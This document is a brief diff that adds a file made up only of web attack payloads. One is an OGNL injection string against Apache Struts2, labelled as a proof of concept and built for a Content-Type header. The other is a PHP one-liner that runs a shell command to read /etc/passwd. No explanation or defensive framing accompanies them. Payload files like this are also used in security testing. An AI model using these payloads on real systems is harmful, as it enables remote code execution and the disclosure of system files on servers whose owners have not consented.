@@ -1,0 +1,7 @@
+%{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘X-Ack-Shankar-POC’,4*4)}.multipart/form-data
+
+
+
+
+
+<?php system("cat /etc/passwd");?>
